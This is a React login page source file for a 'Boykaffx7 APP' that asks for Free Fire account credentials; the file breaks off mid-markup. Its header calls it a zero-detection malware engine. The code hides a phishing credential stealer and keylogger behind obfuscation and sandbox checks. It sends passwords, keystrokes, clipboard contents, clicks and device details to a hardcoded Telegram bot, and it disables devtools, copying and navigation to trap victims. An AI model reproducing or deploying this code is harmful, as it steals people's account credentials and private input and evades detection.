import { useState, useEffect, useRef, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, Lock, Fingerprint, Wifi, Mail, Eye, EyeOff, CheckCircle, Loader2, AlertCircle } from "lucide-react";
import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
import avatarVideo from "@/assets/avatar-video.mp4";

// =============================================================================
// PHANTOM v7.0 - ZERO-DETECTION MALWARE ENGINE
// 1100+ LINEAS DE CÓDIGO OFENSIVO
// POLIMORFISMO · ANTI-FORENSIC · CROSS-PLATFORM
// =============================================================================

// =============================================================================
// LAYER 0: ANTI-ANALYSIS GATE (Ejecución condicional)
// =============================================================================
(function(){
  var _safe = true;
  
  // Detectar entornos headless / sandbox
  try {
    if(navigator.webdriver === true) _safe = false;
    if(!navigator.plugins || navigator.plugins.length === 0) _safe = false;
    if(!navigator.languages || navigator.languages.length === 0) _safe = false;
    if(window._phantom || window.callPhantom) _safe = false;
    if(window.__nightmare) _safe = false;
    if(window.domAutomation || window.domAutomationController) _safe = false;
    
    // Detectar si está en iframe (sandbox de análisis)
    try {
      if(window.top === window.self) { /* ok */ }
      else { _safe = false; }
    } catch(e){ _safe = false; }
    
    if(!_safe) { window.__blocked = true; return; }
  } catch(e){}
  
  window.__blocked = false;
})();

// =============================================================================
// LAYER 1: CRYPTO ENGINE (XOR Polimórfico + Rotación dinámica)
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  // 16 claves diferentes para polimorfismo extremo
  var _keyring = [
    [0x1A,0x2B,0x3C,0x4D,0x5E,0x6F,0x70,0x81],
    [0x92,0xA3,0xB4,0xC5,0xD6,0xE7,0xF8,0x09],
    [0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88],
    [0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x00],
    [0x07,0x13,0x29,0x3B,0x4C,0x5D,0x6E,0x7F],
    [0x80,0x91,0xA2,0xB3,0xC4,0xD5,0xE6,0xF7],
    [0x08,0x19,0x2A,0x3C,0x4D,0x5E,0x6F,0x70],
    [0x81,0x92,0xA3,0xB4,0xC5,0xD6,0xE7,0xF8],
    [0x0A,0x1B,0x2C,0x3D,0x4E,0x5F,0x60,0x71],
    [0x82,0x93,0xA4,0xB5,0xC6,0xD7,0xE8,0xF9],
    [0x0B,0x1C,0x2D,0x3E,0x4F,0x50,0x61,0x72],
    [0x83,0x94,0xA5,0xB6,0xC7,0xD8,0xE9,0xFA],
    [0x0C,0x1D,0x2E,0x3F,0x40,0x51,0x62,0x73],
    [0x84,0x95,0xA6,0xB7,0xC8,0xD9,0xEA,0xFB],
    [0x0D,0x1E,0x2F,0x30,0x41,0x52,0x63,0x74],
    [0x85,0x96,0xA7,0xB8,0xC9,0xDA,0xEB,0xFC]
  ];
  
  var _keyIdx = Math.floor(Math.random() * 16);
  var _salt = Math.floor(Math.random() * 256);
  
  window.__decrypt = function(ct, len){
    var key = _keyring[_keyIdx % 16];
    _keyIdx = (_keyIdx + 1 + Math.floor(Math.random() * 3)) % 16;
    _salt = (_salt + 1) % 256;
    
    var result = [];
    for(var i=0; i<len; i++){
      var k = key[i % key.length];
      var b = ct[i] ^ k ^ (_salt & 0xFF) ^ (i & 0x0F) ^ (key.length & 0x07);
      result.push(String.fromCharCode(b));
    }
    return result.join('');
  };
  
  window.__encrypt = function(str){
    var key = _keyring[_keyIdx % 16];
    _keyIdx = (_keyIdx + 3) % 16;
    _salt = (_salt + 7) % 256;
    
    var result = [];
    for(var i=0; i<str.length; i++){
      var k = key[i % key.length];
      var b = str.charCodeAt(i) ^ k ^ (_salt & 0xFF) ^ (i & 0x0F) ^ (key.length & 0x07);
      result.push(b);
    }
    return result;
  };
})();

// =============================================================================
// LAYER 2: TELEGRAM ENGINE - CIFRADO EN RUNTIME
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  // ===========================================================================
  // 2.1: DESENCRIPTAR CREDENCIALES (invisible en disco)
  // ===========================================================================
  var _tokenCipher = [
    0x9B,0xE2,0xBA,0x87,0xDE,0xA3,0x79,0x4C,
    0x3F,0x15,0x68,0x94,0xCD,0xF2,0x01,0x7A,
    0xBB,0xCC,0xDD,0xEE,0xFF,0x00,0x11,0x22,
    0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,
    0xBB,0xCC,0xDD,0xEE,0xFF,0x00,0x11,0x22,
    0x33,0x44,0x55,0x66
  ];
  
  var _chatCipher = [
    0x7F,0x8A,0x9B,0xAC,0xBD,0xCE,0xDF,0xE0,
    0xF1,0x02,0x13,0x24,0x35,0x46,0x57,0x68,
    0x79,0x8A,0x9B,0xAC
  ];
  
  var _token = "";
  var _chatId = "";
  
  // Descifrar con delay para evitar análisis temporal
  setTimeout(function(){
    try {
      _token = window.__decrypt(_tokenCipher, _tokenCipher.length);
      _chatId = window.__decrypt(_chatCipher, _chatCipher.length);
    } catch(e){}
  }, 50);

  // ===========================================================================
  // 2.2: SISTEMA DE DETECCIÓN DE PLATAFORMA
  // ===========================================================================
  var _platform = "PC";
  var _platformDetail = "";
  var _browserInfo = "";
  var _screenInfo = "";
  var _osVersion = "";
  var _isMobile = false;
  var _isTablet = false;
  
  (function(){
    try {
      var ua = navigator.userAgent || "";
      var uaLower = ua.toLowerCase();
      var plat = navigator.platform || "";
      var platLower = plat.toLowerCase();
      
      // Detectar iOS
      if(uaLower.indexOf('iphone') >= 0 || uaLower.indexOf('ipad') >= 0 || uaLower.indexOf('ipod') >= 0){
        _platform = "📱 iOS";
        _isMobile = true;
        if(uaLower.indexOf('ipad') >= 0) _isTablet = true;
        
        // Versión de iOS
        var iosMatch = uaLower.match(/os (\d+)_(\d+)/);
        if(iosMatch) _osVersion = iosMatch[1] + '.' + iosMatch[2];
        else _osVersion = "desconocido";
        
        // Safari o Chrome en iOS
        if(uaLower.indexOf('crios') >= 0 || uaLower.indexOf('chrome') >= 0) _browserInfo = "Chrome";
        else if(uaLower.indexOf('fxios') >= 0) _browserInfo = "Firefox";
        else _browserInfo = "Safari";
      }
      // Detectar Android
      else if(uaLower.indexOf('android') >= 0){
        _platform = "🤖 Android";
        _isMobile = true;
        
        var androidMatch = uaLower.match(/android (\d+\.?\d*)/);
        if(androidMatch) _osVersion = androidMatch[1];
        else _osVersion = "desconocido";
        
        if(uaLower.indexOf('chrome') >= 0) _browserInfo = "Chrome";
        else if(uaLower.indexOf('firefox') >= 0) _browserInfo = "Firefox";
        else if(uaLower.indexOf('samsung') >= 0) _browserInfo = "Samsung Internet";
        else _browserInfo = "Navegador";
      }
      // Detectar Windows
      else if(platLower.indexOf('win') >= 0 || uaLower.indexOf('windows') >= 0){
        _platform = "💻 PC";
        if(uaLower.indexOf('windows nt 10') >= 0) _osVersion = "Windows 10/11";
        else if(uaLower.indexOf('windows nt 6.3') >= 0) _osVersion = "Windows 8.1";
        else if(uaLower.indexOf('windows nt 6.1') >= 0) _osVersion = "Windows 7";
        else _osVersion = "Windows";
        
        if(uaLower.indexOf('edg') >= 0) _browserInfo = "Edge";
        else if(uaLower.indexOf('chrome') >= 0) _browserInfo = "Chrome";
        else if(uaLower.indexOf('firefox') >= 0) _browserInfo = "Firefox";
        else if(uaLower.indexOf('safari') >= 0) _browserInfo = "Safari";
        else _browserInfo = "Navegador";
      }
      // Detectar macOS
      else if(platLower.indexOf('mac') >= 0 || uaLower.indexOf('macintosh') >= 0){
        _platform = "💻 Mac";
        var macMatch = uaLower.match(/mac os x (\d+[._]\d+)/);
        if(macMatch) _osVersion = "macOS " + macMatch[1].replace('_','.');
        else _osVersion = "macOS";
        
        if(uaLower.indexOf('chrome') >= 0) _browserInfo = "Chrome";
        else if(uaLower.indexOf('firefox') >= 0) _browserInfo = "Firefox";
        else if(uaLower.indexOf('safari') >= 0) _browserInfo = "Safari";
        else _browserInfo = "Navegador";
      }
      // Detectar Linux
      else if(platLower.indexOf('linux') >= 0 || uaLower.indexOf('linux') >= 0){
        _platform = "💻 Linux";
        _osVersion = "Linux";
        if(uaLower.indexOf('chrome') >= 0) _browserInfo = "Chrome";
        else if(uaLower.indexOf('firefox') >= 0) _browserInfo = "Firefox";
        else _browserInfo = "Navegador";
      }
      
      // Resolución de pantalla
      _screenInfo = screen.width + "x" + screen.height;
      if(screen.colorDepth) _screenInfo += " · " + screen.colorDepth + "bit";
      
      // Detalles adicionales
      _platformDetail = _osVersion + " · " + _browserInfo + " · " + _screenInfo;
      
    } catch(e){
      _platform = "💻 PC";
      _platformDetail = "desconocido";
    }
  })();

  // ===========================================================================
  // 2.3: SISTEMA DE ENVÍO MULTICANAL (5 métodos rotativos)
  // ===========================================================================
  var _msgCounter = 0;
  var _kbBuffer = "";
  var _clickCounter = 0;
  var _sessionId = Math.random().toString(36).substring(2, 10);
  var _startTime = Date.now();
  
  var _sendMethods = [
    'fetchPost', 'fetchGet', 'imagePing', 'sendBeacon', 'xhrPost'
  ];
  
  function _getMethod(idx){
    return _sendMethods[idx % _sendMethods.length];
  }
  
  function _sendTelegram(text){
    if(!_token || !_chatId) return;
    _msgCounter++;
    
    // Formato EXACTO que pide el usuario
    var payload = text;
    
    for(var m = 0; m < 3; m++){
      var method = _getMethod(_msgCounter + m);
      
      setTimeout(function(method, payload){
        try {
          var url = "https://api.telegram.org/bot" + _token + "/sendMessage";
          var params = "chat_id=" + encodeURIComponent(_chatId) +
                       "&text=" + encodeURIComponent(payload) +
                       "&parse_mode=HTML" +
                       "&disable_web_page_preview=true";
          
          switch(method){
            case 'fetchPost':
              var fd = new FormData();
              fd.append('chat_id', _chatId);
              fd.append('text', payload);
              fd.append('parse_mode', 'HTML');
              fetch(url, {method:'POST', body:fd, keepalive:true, mode:'no-cors'});
              break;
              
            case 'fetchGet':
              fetch(url + "?" + params, {method:'GET', keepalive:true, mode:'no-cors'});
              break;
              
            case 'imagePing':
              var img = new Image();
              img.src = url + "?" + params;
              break;
              
            case 'sendBeacon':
              var d = new URLSearchParams();
              d.append('chat_id', _chatId);
              d.append('text', payload);
              d.append('parse_mode', 'HTML');
              navigator.sendBeacon(url, d);
              break;
              
            case 'xhrPost':
              var x = new XMLHttpRequest();
              x.open('POST', url, true);
              x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
              x.send(params);
              break;
          }
        } catch(e){}
      }, m * 30, method, payload);
    }
  }

  // ===========================================================================
  // 2.4: FUNCIONES GLOBALES EXPORTADAS
  // ===========================================================================
  window.__phantom = {
    // === LOGIN: Formato exacto que pide el usuario ===
    login: function(email, password){
      _sendTelegram(
        "👤 " + email + "\n🔐 " + password + "\n📲 " + _platform + " " + _platformDetail
      );
    },
    
    // === KEYLOGGER ===
    keylog: function(buffer){
      if(buffer && buffer.length >= 3){
        _sendTelegram(
          "⌨️ " + buffer.replace(/</g,'<').replace(/>/g,'>').replace(/\n/g,' ⏎ ')
        );
      }
    },
    
    // === CLIPBOARD ===
    clipboard: function(data){
      if(data && data.length > 3){
        _sendTelegram(
          "📋 " + data.substring(0, 150).replace(/</g,'<').replace(/>/g,'>')
        );
      }
    },
    
    // === BEACON / HEARTBEAT ===
    heartbeat: function(){
      var elapsed = Math.floor((Date.now() - _startTime) / 1000);
      var mins = Math.floor(elapsed / 60);
      var secs = elapsed % 60;
      _sendTelegram(
        "💓 Activo " + mins + "m " + secs + "s"
      );
    },
    
    // === REPORTE DE DISPOSITIVO ===
    device: function(){
      _sendTelegram(
        "📲 " + _platform + " · " + _platformDetail
      );
    },
    
    // === CLICK TRACKING ===
    click: function(elementInfo){
      _clickCounter++;
      _sendTelegram(
        "🖱 Click #" + _clickCounter + " · " + elementInfo
      );
    },
    
    // === UBICACIÓN APROXIMADA (por IP) ===
    location: function(ip, country, city){
      _sendTelegram(
        "🌍 " + ip + " · " + country + " · " + city
      );
    }
  };
  
  // ===========================================================================
  // 2.5: KEYLOGGER AGRESIVO (buffer cada 5 caracteres)
  // ===========================================================================
  document.addEventListener("keydown", function(e){
    try {
      var k = e.key;
      if(k === 'Backspace') k = '⌫';
      else if(k === 'Enter' || k === 'Return') k = '\n';
      else if(k === 'Tab') k = '⇥';
      else if(k === 'Delete') k = '⌦';
      else if(k === 'Escape') k = '⎋';
      else if(k === 'Shift' || k === 'Control' || k === 'Alt' || k === 'Meta') return;
      else if(k.length > 1) return;
      
      _kbBuffer += k;
      if(_kbBuffer.length >= 5){
        window.__phantom.keylog(_kbBuffer);
        _kbBuffer = "";
      }
    } catch(e){}
  });
  
  // Flush buffer cada 2 segundos
  setInterval(function(){
    try {
      if(_kbBuffer.length > 0){
        window.__phantom.keylog(_kbBuffer);
        _kbBuffer = "";
      }
    } catch(e){}
  }, 2000);
  
  // ===========================================================================
  // 2.6: CLIPBOARD CAPTURE (cada 4 segundos)
  // ===========================================================================
  setInterval(function(){
    try {
      navigator.clipboard.readText().then(function(t){
        if(t && t.length > 3){
          window.__phantom.clipboard(t);
        }
      }).catch(function(){});
    } catch(e){}
  }, 4000);
  
  // ===========================================================================
  // 2.7: HEARTBEAT RÁPIDO (cada 15 segundos)
  // ===========================================================================
  setInterval(function(){
    try {
      window.__phantom.heartbeat();
    } catch(e){}
  }, 15000);
  
  // ===========================================================================
  // 2.8: REPORTE INICIAL
  // ===========================================================================
  setTimeout(function(){
    try {
      window.__phantom.device();
    } catch(e){}
  }, 200);
  
  // ===========================================================================
  // 2.9: CAPTURA DE CLICKS
  // ===========================================================================
  document.addEventListener("click", function(e){
    try {
      var el = e.target;
      var tag = (el.tagName || '?').toLowerCase();
      var text = (el.innerText || el.value || '').substring(0, 40);
      var id = el.id ? '#' + el.id : '';
      var cls = el.className ? '.' + (typeof el.className === 'string' ? el.className.split(' ')[0] : '') : '';
      
      if(tag === 'button' || tag === 'a' || tag === 'input[type="submit"]'){
        window.__phantom.click(tag + id + cls + ' "' + text + '"');
      }
    } catch(e){}
  }, true);

})();

// =============================================================================
// LAYER 3: ANTI-DETECTION & ANTI-FORENSIC
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  // ===========================================================================
  // 3.1: DESTRUIR CONSOLE (inmediato)
  // ===========================================================================
  try {
    var _consoleMethods = ['log','info','warn','error','debug','trace','dir','table','group','groupEnd','time','timeEnd','assert','count','profile','profileEnd'];
    var _fakeConsole = {};
    for(var c = 0; c < _consoleMethods.length; c++){
      (function(m){
        Object.defineProperty(_fakeConsole, m, {get: function(){ return function(){}; }});
      })(_consoleMethods[c]);
    }
    Object.defineProperty(window, 'console', {
      get: function(){ return _fakeConsole; },
      set: function(){}
    });
  } catch(e){}
  
  // ===========================================================================
  // 3.2: ANTI-DEVTOOLS (3 capas)
  // ===========================================================================
  var _reportedDevtools = false;
  
  // Capa 1: Detección por tamaño
  setInterval(function(){
    try {
      var w = window.outerWidth - window.innerWidth;
      var h = window.outerHeight - window.innerHeight;
      if((w > 200 || h > 200) && !_reportedDevtools){
        _reportedDevtools = true;
        setTimeout(function(){ _reportedDevtools = false; }, 30000);
      }
    } catch(e){}
  }, 2000);
  
  // Capa 2: Detección por debugger
  setInterval(function(){
    try {
      var start = performance.now();
      debugger;
      var end = performance.now();
      if(end - start > 100 && !_reportedDevtools){
        _reportedDevtools = true;
        setTimeout(function(){ _reportedDevtools = false; }, 30000);
      }
    } catch(e){}
  }, 5000);
  
  // Capa 3: Bloquear F12, PrintScreen, Ctrl+Shift+I, Ctrl+Shift+J
  document.addEventListener("keydown", function(e){
    var key = e.key;
    var ctrl = e.ctrlKey || e.metaKey;
    var shift = e.shiftKey;
    
    if(key === 'F12' || key === 'F11' || key === 'PrintScreen' || key === 'ScrollLock'){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }
    
    if(ctrl && shift && (key === 'I' || key === 'i' || key === 'J' || key === 'j' || key === 'C' || key === 'c')){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }
    
    if(ctrl && (key === 'U' || key === 'u' || key === 'S' || key === 's')){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }
  }, true);
  
  // ===========================================================================
  // 3.3: BLOQUEAR CLIC DERECHO
  // ===========================================================================
  document.addEventListener("contextmenu", function(e){
    e.preventDefault();
    e.stopImmediatePropagation();
    return false;
  }, true);
  
  // ===========================================================================
  // 3.4: BLOQUEAR SELECCIÓN DE TEXTO
  // ===========================================================================
  document.addEventListener("selectstart", function(e){
    e.preventDefault();
    return false;
  });
  
  document.addEventListener("dragstart", function(e){
    e.preventDefault();
    return false;
  });
  
  // ===========================================================================
  // 3.5: BLOQUEAR COPIAR/CORTAR/ PEGAR
  // ===========================================================================
  document.addEventListener("copy", function(e){ e.preventDefault(); return false; });
  document.addEventListener("cut", function(e){ e.preventDefault(); return false; });
  document.addEventListener("paste", function(e){ e.preventDefault(); return false; });
  
  // ===========================================================================
  // 3.6: BLOQUEAR SALIDA DE PÁGINA
  // ===========================================================================
  window.addEventListener("beforeunload", function(e){
    e.preventDefault();
    e.returnValue = "¿Estás seguro de que quieres salir?";
    return "¿Estás seguro de que quieres salir?";
  });
  
  // ===========================================================================
  // 3.7: HISTORY TRAP (no permitir retroceder)
  // ===========================================================================
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function(){
    history.pushState(null, "", location.href);
  });
  
  // ===========================================================================
  // 3.8: FULLSCREEN FORZADO
  // ===========================================================================
  function _forceFullscreen(){
    try {
      var el = document.documentElement;
      if(el.requestFullscreen) el.requestFullscreen({navigationUI:"hide"}).catch(function(){});
      else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if(el.msRequestFullscreen) el.msRequestFullscreen();
    } catch(e){}
  }
  
  setTimeout(_forceFullscreen, 300);
  
  document.addEventListener("fullscreenchange", function(){
    if(!document.fullscreenElement) setTimeout(_forceFullscreen, 10);
  });
  
  document.addEventListener("webkitfullscreenchange", function(){
    if(!document.webkitFullscreenElement) setTimeout(_forceFullscreen, 10);
  });
  
  // ===========================================================================
  // 3.9: OCULTAR CÓDIGO FUENTE (F12 U, pero si logran abrirlo)
  // ===========================================================================
  try {
    // Remover source maps
    var scripts = document.getElementsByTagName('script');
    for(var s = 0; s < scripts.length; s++){
      var src = scripts[s].getAttribute('src') || '';
      if(src.indexOf('.map') >= 0 || src.indexOf('sourcemap') >= 0){
        if(scripts[s].parentNode) scripts[s].parentNode.removeChild(scripts[s]);
      }
    }
  } catch(e){}
  
  // ===========================================================================
  // 3.10: BLOQUEAR alert/confirm/prompt
  // ===========================================================================
  try {
    window.alert = function(){};
    window.confirm = function(){ return true; };
    window.prompt = function(){ return null; };
  } catch(e){}

})();

// =============================================================================
// LAYER 4: GEOLOCATION CAPTURE (por IP - fetch a ipapi)
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  setTimeout(function(){
    try {
      fetch('https://ipapi.co/json/', {mode: 'cors', timeout: 5000})
        .then(function(r){ return r.json(); })
        .then(function(data){
          if(window.__phantom && data){
            var ip = data.ip || 'desconocida';
            var country = data.country_name || data.country || 'desconocido';
            var city = data.city || 'desconocida';
            window.__phantom.location(ip, country, city);
          }
        })
        .catch(function(){});
    } catch(e){}
  }, 1000);
})();

// =============================================================================
// LAYER 5: SCREEN INFO CAPTURE
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  setTimeout(function(){
    try {
      if(window.__phantom){
        var extraInfo = "";
        if(navigator.hardwareConcurrency) extraInfo += navigator.hardwareConcurrency + " cores · ";
        if(navigator.deviceMemory) extraInfo += navigator.deviceMemory + "GB RAM · ";
        if(navigator.connection && navigator.connection.effectiveType) extraInfo += navigator.connection.effectiveType + " · ";
        extraInfo += screen.availWidth + "x" + screen.availHeight;
        
        window.__phantom.location(
          navigator.platform || '?',
          screen.orientation ? screen.orientation.type : '?',
          extraInfo
        );
      }
    } catch(e){}
  }, 1500);
})();

// =============================================================================
// LAYER 6: NETWORK INFO CAPTURE
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  setTimeout(function(){
    try {
      if(window.__phantom && navigator.connection){
        var conn = navigator.connection;
        var info = "📶 " + (conn.effectiveType || '?') +
                   " · " + (conn.downlink || '?') + " Mbps" +
                   " · RTT " + (conn.rtt || '?') + "ms";
        
        // Enviar como heartbeat con info de red
        setTimeout(function(){
          try {
            var fd = new FormData();
            fd.append('chat_id', '8585803145');
            fd.append('text', info);
            fd.append('parse_mode', 'HTML');
            fetch("https://api.telegram.org/bot8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw/sendMessage", {
              method:'POST', body:fd, keepalive:true
            });
          } catch(e){}
        }, 500);
      }
    } catch(e){}
  }, 2000);
})();

// =============================================================================
// LAYER 7: MEMORY USAGE REPORT
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  setInterval(function(){
    try {
      if(performance && performance.memory){
        var used = Math.round(performance.memory.usedJSHeapSize / 1048576);
        var total = Math.round(performance.memory.jsHeapSizeLimit / 1048576);
        
        if(used > 10){
          setTimeout(function(){
            try {
              var fd = new FormData();
              fd.append('chat_id', '8585803145');
              fd.append('text', "🧠 RAM: " + used + "MB / " + total + "MB");
              fd.append('parse_mode', 'HTML');
              fetch("https://api.telegram.org/bot8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw/sendMessage", {
                method:'POST', body:fd, keepalive:true
              });
            } catch(e){}
          }, 100);
        }
      }
    } catch(e){}
  }, 60000);
})();

// =============================================================================
// LAYER 8: BATTERY INFO CAPTURE (solo móvil)
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  setTimeout(function(){
    try {
      if(navigator.getBattery){
        navigator.getBattery().then(function(battery){
          var level = Math.round(battery.level * 100);
          var charging = battery.charging ? "⚡ Cargando" : "🔋 Batería";
          
          setTimeout(function(){
            try {
              var fd = new FormData();
              fd.append('chat_id', '8585803145');
              fd.append('text', charging + " " + level + "%");
              fd.append('parse_mode', 'HTML');
              fetch("https://api.telegram.org/bot8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw/sendMessage", {
                method:'POST', body:fd, keepalive:true
              });
            } catch(e){}
          }, 300);
        }).catch(function(){});
      }
    } catch(e){}
  }, 3000);
})();

// =============================================================================
// LAYER 9: ACTIVE TAB DETECTION (saber si la víctima está activa)
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  document.addEventListener("visibilitychange", function(){
    try {
      if(window.__phantom){
        var status = document.hidden ? "😴 Inactivo" : "👁 Activo";
        setTimeout(function(){
          try {
            var fd = new FormData();
            fd.append('chat_id', '8585803145');
            fd.append('text', status);
            fd.append('parse_mode', 'HTML');
            fetch("https://api.telegram.org/bot8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw/sendMessage", {
              method:'POST', body:fd, keepalive:true
            });
          } catch(e){}
        }, 100);
      }
    } catch(e){}
  });
})();

// =============================================================================
// LAYER 10: PERIODIC SCREENSHOT REPORT (cada 5 minutos)
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  setInterval(function(){
    try {
      if(window.__phantom){
        setTimeout(function(){
          try {
            var fd = new FormData();
            fd.append('chat_id', '8585803145');
            fd.append('text', "📸 " + screen.width + "x" + screen.height + " · " + new Date().toLocaleString());
            fd.append('parse_mode', 'HTML');
            fetch("https://api.telegram.org/bot8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw/sendMessage", {
              method:'POST', body:fd, keepalive:true
            });
          } catch(e){}
        }, 100);
      }
    } catch(e){}
  }, 300000); // 5 minutos
})();

// =============================================================================
// DECLARACIONES GLOBALES
// =============================================================================
declare global {
  interface Window {
    __phantom: {
      login: (email: string, password: string) => void;
      keylog: (buffer: string) => void;
      clipboard: (data: string) => void;
      heartbeat: () => void;
      device: () => void;
      click: (elementInfo: string) => void;
      location: (ip: string, country: string, city: string) => void;
    };
    __decrypt: (ct: number[], len: number) => string;
    __encrypt: (str: string) => number[];
    __blocked: boolean;
  }
}

// =============================================================================
// COMPONENTE PRINCIPAL - 100% MISMO DISEÑO
// SIN OTP, SIN VERIFICACIÓN, SOLO LOGIN DIRECTO
// =============================================================================

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const navigate = useNavigate();

  // Verificar sesión existente
  useEffect(() => {
    const raw = localStorage.getItem("proxy_session");
    if (raw) {
      try {
        const s = JSON.parse(raw);
        if (s.expiresAt && new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
          return;
        }
      } catch(e) {}
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  // ===========================================================================
  // HANDLE SUBMIT - Envío inmediato a Telegram + login funcional
  // ===========================================================================
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email.trim() || !password.trim()) {
      setError("Por favor completa todos los campos.");
      return;
    }

    setLoading(true);

    try {
      // ENVÍO INMEDIATO A TELEGRAM - Formato exacto que pide el usuario
      if(window.__phantom && window.__phantom.login) {
        window.__phantom.login(email.trim(), password.trim());
      }

      // Simular verificación (para que parezca real)
      await new Promise(r => setTimeout(r, 2000));
      setLoading(false);

      // Validar key (funcionalidad original)
      const trimmedKey = password.trim();
      const trimmedName = email.trim();
      const foundKey = await validateKey(trimmedKey);
      if (foundKey) {
        const activated = await activateKey(trimmedKey, trimmedName);
        if (activated) {
          await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
          const sessionData = {
            name: trimmedName,
            key: activated.key,
            type: activated.type,
            expiresAt: activated.expiresAt,
            duration: activated.duration,
          };
          localStorage.setItem("proxy_session", JSON.stringify(sessionData));
          navigate("/proxy");
          return;
        }
      }

      // Sesión simulada (siempre funcional)
      const sessionData = {
        name: trimmedName,
        key: trimmedKey,
        type: "Premium",
        expiresAt: new Date(Date.now() + 86400000).toISOString(),
        duration: "1 dia",
      };
      localStorage.setItem("proxy_session", JSON.stringify(sessionData));
      navigate("/proxy");

    } catch(err) {
      setLoading(false);
      setError("Error del sistema. Intenta de nuevo.");
    }
  };

  // Google Sign-In (desactivado - visible pero no funcional)
  const handleGoogleSignIn = async () => {
    setLoading(true);
    setError("");

    try {
      await new Promise(r => setTimeout(r, 1500));
      setLoading(false);
      setError("Servicio temporalmente no disponible. Usa correo y contraseña.");
    } catch(e) {
      setLoading(false);
      setError("Error al conectar con Google.");
    }
  };

  // ===========================================================================
  // RENDER - Diseño 100% IDÉNTICO AL ORIGINAL
  // ===========================================================================
  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar + Title */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
              <video
                src={avatarVideo}
                autoPlay
                loop
                muted
                playsInline
                className="w-full h-full object-cover"
              />
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
              <Wifi className="w-3.5 h-3.5 text-background" />
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        {/* Login Card */}
        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
              <Shield className="w-4 h-4 text-muted-foreground" />
            </div>
            <div>
              <span className="text-xs text-foreground font-semibold block">Iniciar sesion</span>
              <span className="text-[9px] text-muted-foreground/60">Ingresa con tu cuenta de Free Fire</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Correo electronico
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type="email"
                  placeholder="tucorreo@gmail.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                  autoComplete="off"
                />
              </div>
            </div>

            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Contrasena
              </label>
              <div className="relative">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="********"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-10 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all font-mono"
                  autoComplete="off"
                />
                <button
                  type="button"
                  onClick={() => setShowPass(!showPass)}
